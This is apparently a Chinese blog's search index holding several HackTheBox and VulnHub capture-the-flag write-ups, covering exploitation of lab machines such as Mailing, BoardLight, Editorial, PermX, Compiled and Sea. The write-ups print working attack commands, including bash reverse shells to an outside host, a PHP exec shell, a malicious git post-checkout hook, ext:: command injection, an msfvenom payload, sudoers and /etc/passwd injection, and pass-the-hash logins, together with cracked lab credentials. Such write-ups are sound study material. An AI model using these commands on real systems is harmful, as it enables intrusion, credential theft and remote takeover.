进入http://mailing.htb\n点击Download，就是/download.php\nDirectory Traversal #\r进行抓包，发现可以下载文件\n尝试修改file参数，成功得到hosts文件\n目前这个php文件至少能够读取文件\n由于刚才Nmap ，扫描出来邮件服务是hMailServer\n经过搜索以及ChatGPT，获取到路径为：C:\\Program Files (x86)\\hMailServer\\Bin\\hMailServer.ini\nMD5解密后获得明文：homenetworkingadministrator\n回到之前的instruction.pdf，在ending那里，发送第一封邮件之后，Maya会读取我们的邮件\n通过pop3端口连接邮箱，不过里面什么都没有\nCVE-2024-21413 #\rGithub：\n先打开监听器\nresponder -I tun0 -v 运行poc\npython3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url \u0026#39;\\\\10.10.16.8\\PoC\u0026#39; --subject \u0026#34;Hello world\u0026#34; 在监听器处收到hash，尝试解密\n得到maya的密码：m4y4ngs4ri\n由于ssh端口没有开，不过可以测试winrm的端口5985\nEvil Winrm #\revil-winrm -i mailing.htb -u maya -p \u0026#39;m4y4ngs4ri\u0026#39; 成功进入。\n在桌面拿到user.txt\nPrivilege Escalation #\r在Program Files 文件夹下发现一个LibreOffice\n将其License文件下载下来看\n在readme中发现版本信息\nCVE-2023-2255 #\rGithub：elweth-sec/CVE-2023-2255: CVE-2023-2255 Libre Office (github.com)\n发现C盘下面的Important Document文件夹具有特殊权限\n管理员和系统账户对目录有完全控制权限。Maya用户和已认证用户对目录具有修改权限。\npython3 CVE-2023-2255.py --cmd \u0026#39;net localgroup Administradores maya /add\u0026#39; --output \u0026#39;exploit.odt\u0026#39; 直接把maya加到管理员组里面去\n稍等一会\n使用crackmapexec来获取localadmin的哈希值\ncrackmapexec smb 10.10.11.14 -u maya -p \u0026#34;m4y4ngs4ri\u0026#34; --sam 最后使用impacket-wmiexec传入hash值登录\nimpacket-wmiexec localadmin@mailing.htb -hashes \u0026#34;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae\u0026#34; Summary #\rCVE-2024-21413获取hash原理：在邮件的 --url 参数中指定了一个 UNC 路径（\\\\10.10.16.8\\PoC）。UNC 路径通常用于网络共享，当目标系统处理这个路径时，它会尝试与指定的服务器（10.10.16.8）建立连接。\n在 Windows 系统中，当系统尝试访问 UNC 路径时，它可能会自动尝试进行身份验证。这个身份验证过程中，Windows 会发送 NTLMv2 哈希来验证用户身份。如果 responder 正在监听这个网络请求，它可以捕获这些哈希值。\n如果这些哈希值能够被破解，那么就能够登录相应的服务或者系统。\nNTLM 哈希认证机制的特性：NTLM 认证通常与 SMB协议配合使用，通常会使用 TCP 445 端口进行通信。NTLM 认证的机制允许通过密码的哈希值进行身份验证，impacket-wmiexec使用 NT 哈希（通过 Pass-the-Hash 技术）来模拟用户身份，从而无需输入密码就能执行远程命令。\nwindows的题目还是接触太少了😥\n","date":"2024-09-05","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-mailing/","section":"Posts","summary":"","title":"HTB-Mailing","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O boardlight.htb 开放端口：22、80\nServer：Apache 2.4.41 (Ubuntu)\nDirsearch #\rdirsearch -u boardlight.htb -t 50 Subdomain Fuzzing #\r在页尾发现一个：Board.htb\n修改 /etc/hosts\nffuf -w main.txt -u http://board.htb -H \u0026#34;Host:FUZZ.board.htb\u0026#34; -ac 获得子域名：crm\n并且更新 /etc/hosts\nWeak Auth #\r进入crm.board.htb\n用户名密码：admin，admin\nCVE-2023-30253 #\rGithub：dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253\n添加站点以及页面\n尝试修改源码，回显成功\n\u0026lt;?pHp exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt; /dev/tcp/10.10.16.8/100 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; 拿到shell\n这里使用python脚本来简化。\n上传linpeas.sh ，并且执行\n发现存在3306端口，并且在conf里找到登陆密码\n$dolibarr_main_db_host=\u0026#39;localhost\u0026#39;;\r$dolibarr_main_db_port=\u0026#39;3306\u0026#39;;\r$dolibarr_main_db_name=\u0026#39;dolibarr\u0026#39;;\r$dolibarr_main_db_prefix=\u0026#39;llx_\u0026#39;;\r$dolibarr_main_db_user=\u0026#39;dolibarrowner\u0026#39;;\r$dolibarr_main_db_pass=\u0026#39;serverfun2$2023!!\u0026#39;;\r$dolibarr_main_db_type=\u0026#39;mysqli\u0026#39;;\r$dolibarr_main_db_character_set=\u0026#39;utf8\u0026#39;;\r$dolibarr_main_db_collation=\u0026#39;utf8_unicode_ci\u0026#39;; 查询user表\n格式化一下\n| rowid | entity | ref_employee | ref_ext | admin | employee | fk_establishment | datec | tms | fk_user_creat | fk_user_modif | login | pass_encoding | pass_crypted | pass_temp | api_key | gender | civility | lastname | firstname | address | zip | town | fk_state | fk_country | birth | birth_place | job | office_phone | office_fax | user_mobile | personal_mobile | email | personal_email | signature | socialnetworks | fk_soc | fk_socpeople | fk_member | fk_user | fk_user_expense_validator | fk_user_holiday_validator | idpers1 | idpers2 | idpers3 | note_public | note_private | model_pdf | datelastlogin | datepreviouslogin | datelastpassvalidation | datestartvalidity | dateendvalidity | iplastlogin | ippreviouslogin | egroupware_id | ldap_sid | openid | statut | photo | lang | color | barcode | fk_barcode_type | accountancy_code | nb_holiday | thm | tjm | salary | salaryextra | dateemployment | dateemploymentend | weeklyhours | import_key | default_range | default_c_exp_tax_cat | national_registration_number | fk_warehouse |\r|-------|--------|--------------|---------|-------|----------|------------------|---------------------|---------------------|---------------|---------------|----------|---------------|----------------------------------------------------------------------------------------------------|------------|---------|--------|----------|------------|-----------|---------|------|-------|----------|------------|-------|-------------|-----|--------------|------------|-------------|-----------------|-------|----------------|-----------|----------------|---------|--------------|---------|---------|---------------------------|---------------------------|---------|---------|---------|-------------|--------------|-----------|---------------------|----------------------|-----------------------|-------------------|-----------------|--------------|-----------------|---------------|----------|--------|--------|-------|-------|---------|----------------|------------------|-------------|-----|-----|---------|--------------|-------------------|---------------------|-------------|------------|---------------|----------------------|-------------------------------|--------------|\r| 1 | 0 | NULL | NULL | 1 | 1 | 0 | 2024-05-13 13:21:56 | 2024-05-13 13:21:56 | NULL | NULL | dolibarr | NULL | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | NULL | NULL | NULL | NULL | SuperAdmin | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | 2024-05-15 09:57:04 | 2024-05-13 23:23:59 | NULL | NULL | NULL | 10.10.14.31 | 10.10.14.41 | NULL | NULL | NULL | 1 | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL |\r| 2 | 1 | NULL | NULL | 0 | 1 | 0 | 2024-05-13 13:24:01 | 2024-05-15 09:58:40 | NULL | NULL | admin | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | yr6V3pXd9QEI | NULL | NULL | NULL | admin | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | 2024-09-03 20:37:39 | 2024-09-03 20:04:27 | NULL | NULL | NULL | 10.10.16.8 | 10.10.16.24 | NULL | NULL | NULL | 1 | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | 这里我使用hashcat爆破失败，尝试将mysql的密码作为ssh的密码登录成功，并且得到user.txt。\nsudo -l ，并没有特殊权限的文件。\nCVE-2022-37706 #\rGithub：MaherAzzouzi/CVE-2022-37706-LPE-exploit\n在Files with Interesting Permissions ，里发现一个enlightenment的东西\n将exploit.sh ，下载下来执行，获取到root权限。\nSummary #\r端口扫描、子域名扫描、目录扫描是标准的前置过程。\n针对网站细节信息进行搜集获取CVE。\nLinpeas暴露出的特殊权限的文件。\nHashcat不一定能够爆破出正确的明文。\n","date":"2024-09-04","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-boardlight/","section":"Posts","summary":"","title":"HTB-BoardLight","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O editorial.htb 开放端口：**22**、**80**\nServer：**nginx 1.18.0** （Ubuntu）\nDirsearch #\rdirsearch -u editorial.htb -t 50 访问：http://editorial.htb/upload\nSSRF #\rBurpsuite开启拦截，点击Preview\n并且可以访问\n由于允许输入url，这里尝试：127.0.0.1，成功得到回显。\n尝试遍历端口服务\n当端口为5000时，响应包出现不同\n访问下载到一个文件\nsudo apt install jq\rcat file | jq 查看authors的api\n{\r\u0026#34;template_mail_message\u0026#34;: \u0026#34;Welcome to the team! We are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nBest regards, Editorial Tiempo Arriba Team.\u0026#34; } Username：dev\nPassword：dev080217_devAPI!@\nssh登录，获取到user.txt\nPrivildge Escalation #\r发现隐藏的git目录\n查看git log\n\u0026#39;template_mail_message\u0026#39;: \u0026#34;Welcome to the team! We are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: prod\\nPassword: 080217_Producti0n_2023!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nBest regards, \u0026#34; + api_editorial_name + \u0026#34; Team.\u0026#34; Username：prod\nPassword：080217_Producti0n_2023!@\nssh prod@editorial.htb cat /opt/internal_apps/clone_changes/clone_prod_change.py\r#!/usr/bin/python3\rimport os\rimport sys\rfrom git import Repo\ros.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;)\rurl_to_clone = sys.argv[1]\rr = Repo.init(\u0026#39;\u0026#39;, bare=True)\rr.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) 这个python脚本可以指定一个参数进行仓库克隆。\nCVE-2022-24439 #\rGit 允许自定义协议扩展，这意味着你可以定义自己的协议来处理特定的操作。通过这种机制，用户可以注册自己的协议处理程序，如 ext::。当 Git 遇到这种协议时，它会调用与之关联的命令。\n百分号%可以理解为空格\nprod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c touch% /tmp/hyh\u0026#39; 成功写入文件\n同样方式写入反弹shell\nprod@editorial:/opt/internal_apps/clone_changes$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.8/100 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;/tmp/revshell.sh\rprod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_chane_prod_change.py \u0026#39;ext::sh -c cat% /tmp/revshell.sh|bash\u0026#39;\r┌──(root㉿kali)-[/home/kali/Downloads]\r└─# nc -lvnp 100 Summary #\r目录扫描出upload页面\nURL输入框存在SSRF漏洞，根据端口扫描并得到备份文件\nGit Log 信息泄露获得prod用户权限\nprod存在可以sudo执行的文件，CVE-2022-24439\n先写入反弹shell文件，再用CVE进行任意文件执行，获取root权限\n","date":"2024-09-03","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-editorial/","section":"Posts","summary":"","title":"HTB-Editorial","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnamp 10.10.11.23 -A -O Opened Ports：22、80\nServer：Apache 2.4.52 (Ubuntu)\nSubdomain Fuzzing #\rGithub：TheKingOfDuck/fuzzDicts: Web Pentesting (github.com)\nffuf -w main.txt -u http://permx.htb/ -H \u0026#34;Host:FUZZ.permx.htb\u0026#34; -mc 200 找到两个子域名：www、lms\n更新**/etc/hosts**\nDirsearch #\rdirsearch -u http://permx.htb/ dirsearch -u lms.permx.htb 在LICENSE里得到Chamilo LMS的版本信息\nGobuster #\rgobuster dir -u http://permx.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 CVE-2023-4220 #\rGithub：Rai2en/CVE-2023-4220-Chamilo-LMS: CVE-2023-4220 (github.com)\n成功上传webshell\n以及反弹shell\n发现mysql用户名以及密码\nmysql -u chamilo -p03F6lY3uXAP2bkW8\rselect username,password from user; 尝试进行爆破，失败。\n存在一个mtz的用户，尝试用数据库的密码进行ssh登录，成功。\nPrivilege Escalation #\r这个脚本用于确保安全地为 /home/mtz/ 目录下的某个文件设置特定用户的权限，防止未经授权的目录访问或操作。\ntouch test\rln -sf /etc/passwd /home/mtz/test # 将test链接到/etc/passwd\rsudo /opt/acl.sh mtz rw /home/mtz/test #给test文件设置为mtz，并且可读可写\recho \u0026#34;hyh::0:0:hyh:/root:/bin/bash\u0026#34; \u0026gt;\u0026gt; ./test #将用户信息写入test\rsu hyh Summary #\r端口、子域名扫描获取web服务相关信息。从CVE入手获取到普通shell权限。\n在/opt/acl.sh中可以构造软链接，将写入的用户信息链接到/etc/passwd即可获取root权限。\n","date":"2024-09-03","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-permx/","section":"Posts","summary":"","title":"HTB-PermX","type":"posts"},{"content":"\rBox Info #\rOS Windows Rated Difficulty Medium Port Scan #\r#linux\rnmap -A -Pn 10.10.11.26 扫描出来3000和5000端口。\n3000端口是一个类似于git的服务，具体是由Gitea驱动的。包含了注册、登录、创建仓库以及拉取代码等等功能。\n5000端口是一个类似于编译功能，可以传入仓库地址。\nGit Rce #\r在3000端口上的richard的Calculator仓库中，发现了git的版本是2.45.0\n结合5000端口上的clone功能，搜索得到漏洞编号为：CVE-2024-32002 的git rce漏洞。\n相关文章：Exploiting CVE-2024-32002: RCE via git clone | Amal Murali\n文章中的示例脚本中是打开一个计算器，那么在这里可以把他改为反弹shell。\n根据文章中的描述，需要创建两个空仓库。\ngit config --global protocol.file.allow always\rgit config --global core.symlinks true\rgit config --global init.defaultBranch main\rrm -rf nothing\rrm -rf toSeeHere\rgit clone http://compiled.htb:3000/hyh/repo1.git\rcd repo1\rmkdir -p y/hooks\rcat \u0026gt;y/hooks/post-checkout \u0026lt;\u0026lt;EOF\r#!bin/sh.exe\rpowershell -e JABjAGw...\rEOF\rchmod +x y/hooks/post-checkout\rgit add y/hooks/post-checkout\rgit commit -m \u0026#34;post-checkout\u0026#34;\rgit push\rcd ..\rgit clone http://compiled.htb:3000/hyh/repo2.git\rcd repo2\rgit submodule add --name x/y \u0026#34;http://compiled.htb:3000/hyh/repo1.git\u0026#34; A/modules/x\rgit commit -m \u0026#34;add-submodule\u0026#34;\rprintf \u0026#34;.git\u0026#34; \u0026gt;dotgit.txt\rgit hash-object -w --stdin \u0026lt;dotgit.txt \u0026gt;dot-git.hash\rprintf \u0026#34;120000 %s 0\\ta\\n\u0026#34; \u0026#34;$(cat dot-git.hash)\u0026#34; \u0026gt;index.info\rgit update-index --index-info \u0026lt;index.info\rgit commit -m \u0026#34;add-symlink\u0026#34;\rgit push 填充到powershell那里来反弹shell。\n然后本地运行这个sh脚本\n这边准备提交repo2的代码,并且监听4321端口\n成功反弹到shell\n查看电脑的用户,发现一个Emily用户\n在C盘Program Files\\Gitea的data目录下发现一个gitea.db数据文件\n这里无法直接下载,要在kali上用metasploit生成木马进行控制.\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.24 lport=9876 -f exe -o shell.exe 然后windows去curl下载，成功触发。\n然后下载db文件\n直接打开查看\n可以发现密码是经过哈希的，加密方式是pbkdf2，后面的列里还有盐值\n这里可以写一个脚本，在网上也能找到\nimport hashlib\rimport binascii\rdef pbkdf2_hash(password, salt, iterations=50000, dklen=50):\rhash_value = hashlib.pbkdf2_hmac(\r\u0026#39;sha256\u0026#39;,\rpassword.encode(\u0026#39;utf-8\u0026#39;),\rsalt,\riterations,\rdklen\r)\rreturn hash_value\rdef find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):\rtarget_hash_bytes = binascii.unhexlify(target_hash)\rwith open(dictionary_file, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file:\rfor line in file:\rpassword = line.strip()\rhash_value = pbkdf2_hash(password, salt, iterations, dklen)\rif hash_value == target_hash_bytes:\rprint(f\u0026#34;Found password: {password}\u0026#34;)\rreturn password\rprint(\u0026#34;Password not found.\u0026#34;)\rreturn None\rsalt = binascii.unhexlify(\u0026#39;227d873cca89103cd83a976bdac52486\u0026#39;)\rtarget_hash = \u0026#39;97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16\u0026#39;\rdictionary_file = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;\rfind_matching_password(dictionary_file, target_hash, salt) 因为当前权限我们无法直接进入Emily的文件夹，所以接下来要使用一个Evil-Winrm\nEvil-Winrm #\revil-winrm是一个可用于黑客攻击/渗透测试的Windows远程管理(WinRM) Shell。\n在桌面发现user的flag，并且发现在电脑中有Visual Studio 2019\nGoogle一下，记得用英文\nCVE-2024-20656 #\rgit clone下来，路径改为一致：Wh04m1001/CVE-2024-20656 (github.com)\n这里187行CopyFile的第一个路径要作为靶机tmp中的第二个shell恶意文件。这个和之前的msfvenom是一样的生成方式。属性使用2019的工具集。\n然后将VS改为Realase模式生成exe，并且上传到靶机。\n还要上传一个RunaCs.exe用来加载木马。\nantonioCoco/RunasCs： RunasCs - Csharp 和 Windows 的开放版本内置runas.exe (github.com)\nMsf同时要进行监听。\n之后meterpreter就能收到shell，并且权限是Administrator，root的flag在Admin的桌面\n","date":"2024-08-31","externalUrl":null,"permalink":"/posts/2024/08/hackthebox-compiled/","section":"Posts","summary":"","title":"HTB-Compiled","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rPort \u0026amp; Dir scan #\r发现一个contact.php。进去看看\n尝试抓包看看。并没有什么回显。\n尝试扫描一下其他的目录。\ndirsearch没扫出来，用gobuster扫描出了一个bike目录。\n重要的是这个license\n这里暴露出了作者的名字\nGithub resource #\r看来网站似乎是用的这个WonderCMS，其中的LICENSE是一模一样的。\n当前CMS的版本的3.2.0\n而经过查找漏洞，发现在WonderCMS的v3.2.0到v3.4.2之间存在漏洞\nCVE-2023-41425 #\rPOC地址：insomnia-jacob/CVE-2023-41425: WonderCMS RCE CVE-2023-41425 (github.com)\n检查exploit.py中的代码，发现访问的是这个路由\n这个路由也是存在的。\n那么就开始攻击。\n┌──(root㉿kali)-[/home/kali/CVE-2023-41425]\r└─# python exploit.py -u http://sea.htb/loginURL -i 10.10.16.16 -p 4444 -r http://10.10.16.16/main.zip 记得要在本地监听端口\n回到contact.php，将exp执行后下面出现的link给传上去。\n即可反弹shell，当前用户权限是普通的www-data，要想办法提权\nkali上有linpeas的脚本，开一个httpserver然后靶机下载就行。记得在/tmp目录下才有写的权限。\n成功执行，不过有点慢\n发现有这几个CVE。\n这个CVE-2021-3156看起来似乎能用。\n不过这个几个漏洞都用不了。\nBrute Force #\r在/var/www/sea目录下面发现一个database.js\n其中有一个密码字段，这里使用hashcat和rockyou字典来破解，字符串里的反斜杠一定要去掉，不然会报错。（以及虚拟机内存一定要开大一点，原来虚拟机2G的内存连hashcat都跑不起来，把他加大到8个G才成功）\n得到密码是：mychemicalromance\n查看/etc/passwd，发现有两个可疑的用户名\n尝试登陆amay，成功进入！\nPrivilege Escalation #\r不过amay并不在超级用户中\n之前linpeas的输出中发现有8080和33815这两个端口，不过外部访问不了，只能自己在命令行里看。\n有的网站需要用到身份认证，可以使用-u 或者\u0026ndash;user 来进行传参，这里用amay的用户密码可以正常访问\nssh -v -N -L 8080:localhost:8080 amay@sea.htb\r#v是详细模式，N是只转发端口，L是转发本地端口，这里仅做一个端口映射，便于本地访问 点击access.log之后出现日志，这里可以抓包修改文件名读取任意文件。\n不仅如此，还可以执行命令。\n尝试给amay加一点权限呢\n/etc/passwd+\u0026amp;\u0026amp;+echo+\u0026#34;amay+ALL=(ALL)+NOPASSWD:+ALL\u0026#34;+\u0026gt;+/etc/sudoers.d/amay+#\r#一定要url编码一下\r/etc/passwd+%26%26+echo+\u0026#34;amay+ALL=(ALL)+NOPASSWD:+ALL\u0026#34;+\u0026gt;+/etc/sudoers.d/amay+# 成功拿到root权限\nroot的flag在root下的root.txt中，user的flag在/home/amay目录里。\nSummary #\r第一次接触国外的在线靶场，感觉这个hackthebox还不错，虽然是边看wp边做的，不过收获还是很多。\n","date":"2024-08-28","externalUrl":null,"permalink":"/posts/2024/08/hackthebox-sea/","section":"Posts","summary":"","title":"HTB-Sea","type":"posts"},{"content":"\r前言 #\r靶机来自Vulnerable By Design ~ VulnHub\n下载链接：https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova\n网络连接方式采用桥接（直接复制物理机网络），便于操作。\n注意！！！！！\n本文内容并非符合预期，而是利用了内核漏洞。因此请不要在意内容。\n存活主机探测 #\r虚拟机开启后如图所示，需要登录。\n#kali\rnmap -O 192.168.101.0/24 使用nmap对局域网存活主机进行扫描，发现该机器上80端口是开启状态，可以直接通过浏览器访问\n欢迎来到 Boot2Root CTF，Morpheus：1。\r你玩 Trinity，试图调查 Cypher 将其他人都拒之门外的 Nebuchadnezzar，至少对于 ssh 来说是这样。\r祝你好运！ - @inguardians @jaybeale 接下来查看81端口，需要身份认证。\n简单的爆破之后无果，尝试寻找其他的解决方式。\n目录扫描 #\r用御剑工具扫描之后，扫不出东西来。不过kali自带的字典也可以用。\n#kali\rgobuster dir -u http://192.168.101.40 -x php,jsp,txt,asp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #如果没有gobuster ，可以使用apt install gobuster 访问graffiti.php，出现可以交互的地方。\n进行攻击 #\r测试之后，任意字符串在提交之后会保存在当前页面，而且是一个存储型的XSS漏洞。\n并且抓包之后可以看到，信息和导入文件名都是可控的。\n那么就尝试写入一句话木马，并且导入到一个php文件中。\n用蚁剑链接成功，并且发现一个提示，在当前目录下存在一个隐藏的png图片。\n#kali\rwget http://192.168.101.40/.cypher-neo.png 下载到kali里面，尝试使用binwalk或者foremost\n#kali\rbinwalk -e .cypher-neo.png --run-as=root 成功分离出东西。经过HXD查看，并没有什么有价值的东西。\n这里了解到一个可以进行提权的脚本：Linpeas\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 在kali上开端口，然后在靶机上将其下载过来。\nchmod +x linpeas.sh\r./linpeas.sh 这里执行完后，并不会出现任何东西。wp说的要反弹shell之后才能正常显示。\n进入网站：反弹shell命令在线生成器|🔰雨苁🔰 (ddosi.org)\n回到之前那个可以上传木马的地方，把这个木马上传之后，再访问。同时kali端要nc监听100端口\nkali成功获得shell。\n这里枚举出来许多漏洞，这里使用的是2022-0847脏管道漏洞。\n相关链接：CVE-2022-0847 Linux 脏管漏洞分析与利用 - FreeBuf网络安全行业门户\n攻击者可以利用该漏洞实现低权限用户提升至 root 权限。\n把poc进行git clone 下来，再传给靶机执行。\nchmod +x Dirty-Pipe.sh\rbash Dirty-Pipe.sh 可以看到权限已经提升到了root\n至此结束\n","date":"2024-08-26","externalUrl":null,"permalink":"/posts/2024/08/matrix-breakout-2-morpheus/","section":"Posts","summary":"","title":"Matrix-Breakout-2-Morpheus","type":"posts"},{"content":"\r前言 #\r靶机来源：Vulnerable By Design ~ VulnHub\n注意！！！！！！\n本文内容纯属非预期，请不要在意本文内容。\n正文 #\r发现有http端口可以访问。直接访问是400报错。\n进行更详细的扫描。可以发现编程语言用的是Python版本为3.9，Web服务器是Apache 2.4.51\n这里卡了好久，查看wp发现是DNS的问题，靶机应该是能够正常http访问的（尬\n#windows\rC:\\Windows\\System32\\drivers\\etc\\hosts\r#linux\r/etc/hosts\r#在最下面加入\r#earth\r192.168.101.41 earth.local\r192.168.101.41 terratest.earth.local\r#最后\ripconfig /flushdns 之后浏览器访问 earth.local即可正常进入\n这里随意输入提交后，出现类似于加密后的字符串。\n进行目录扫描，发现有一个admin的路由可以进入。\n然后robots.txt在https端口也可访问到。\n查看最后一个testingnotes.txt，发现留言。\n测试安全消息传递系统注意：\r*使用 XOR 加密作为算法，在 RSA 中使用应该是安全的。\r*地球已确认他们已收到我们发送的消息。\r*testdata.txt 用于测试加密。\r*terra 用作 Admin Portal 的用户名。\r待办事项：\r*我们如何安全地将每月密钥发送到 Earth？还是我们应该每周更换密钥？\r*需要测试不同的密钥长度以防止暴力破解。密钥应该有多长？\r*需要改进消息界面和管理面板的界面，目前非常基础。 大概信息就是，在index.html的previous message那里的算法是异或，然后是用testdata.txt里的内容进行运算的，由于异或运算的特性，只需要把密文和testdata.txt再进行一次加密即可恢复原文。\nimport binascii\r# 字符串异或\rm = \u0026#34;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth\u0026#39;s history, life appeared in the oceans and began to affect Earth\u0026#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.\u0026#34;\rc = \u0026#34;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a\u0026#34;\r# 将字符串转换为十六进制\rm = binascii.b2a_hex(m.encode(\u0026#34;utf-8\u0026#34;))\r# 进行异或运算\rresult = hex(int(c, 16) ^ int(m, 16))\rprint(result)\r#0x6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174 仔细看，字符串是一直重复的：earthclimatechangebad4humans 。猜测是登陆密码。\n登录成功！\n测试命令，当前用户为apache，不是最高权限root。\n全局查找flag，在var下发现一个\ncat /var/earth_web/user_flag.txt\rCommand output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d] 接下来就要尝试提权了。这里要使用反弹shell。这里直接反弹shell会报错说不允许连接。\n这里只需要把十进制数改为十六进制表示即可。（猜测是防火墙的原因）\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.101.39/100 0\u0026gt;\u0026amp;1\r改为\rbash -i \u0026gt;\u0026amp; /dev/tcp/0xc0.0xa8.0x65.0x27/100 0\u0026gt;\u0026amp;1 接下来进行提权。\n在kali里已经下载有了linpeas脚本，然后开一个http.server服务让靶机下载。\n靶机一定要进入/tmp才有写入的权限，然后运行 bash linpeas.sh。\n居然又发现了这个脏管道CVE，上一篇文章里也是这个漏洞，正好kali里下载有。\n可以发现权限已经提到了root\n拿到flag\n","date":"2024-08-26","externalUrl":null,"permalink":"/posts/2024/08/the-planets-earth/","section":"Posts","summary":"","title":"The Planets: Earth","type":"posts"},{"content":"","date":"2024-08-26","externalUrl":null,"permalink":"/tags/vulnhub/","section":"Tags","summary":"","title":"Vulnhub","type":"tags"},{"content":"","date":"2024-08-26","externalUrl":null,"permalink":"/categories/vulnhub/","section":"Categories","summary":"","title":"Vulnhub","type":"categories"},{"content":"","date":"2024-08-13","externalUrl":null,"permalink":"/tags/moectf/","section":"Tags","summary":"","title":"Moectf","type":"tags"},{"content":"一年一度的MoeCTF又来了，不过我好久没打过CTF了，前段时间一直在搞开发。\nWEB #\r弗拉格之地的入口 #\r直接进入 /robots.txt 发现 /webtutorEntry.php文件，进入即可拿到flag\nez_http #\r注意GET参数那里包含了中文，一定要进行url编码一次\nProveYourLove #\r信息：都七夕了，怎么还是单身狗丫？快拿起勇气向你 crush 